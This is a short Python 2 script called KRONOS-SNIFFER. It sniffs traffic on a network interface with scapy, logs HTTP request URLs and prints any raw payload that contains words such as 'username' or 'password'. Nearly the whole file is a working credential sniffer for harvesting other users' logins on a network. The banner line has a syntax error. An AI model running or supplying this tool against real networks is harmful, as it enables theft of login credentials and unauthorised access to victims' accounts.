#!/usr/bin/python2

import scapy.all as scapy
from scapy.layers import http
from termcolor import colored

print(colored"\n\t\t\t\t\t\t\t\tKRONOS-SNIFFER")

def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(colored("Http Request >>> " + str(url), "white"))
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["user", "username", "email", "pass", "password"]
            for keyword in keywords:
                if keyword in load:
                    print(colored("Possible username/password >>> " + str(load), "blue"))
                    break

interface = raw_input(colored("\n\nEnter Interface >>> ", "white"))

sniffer(interface)
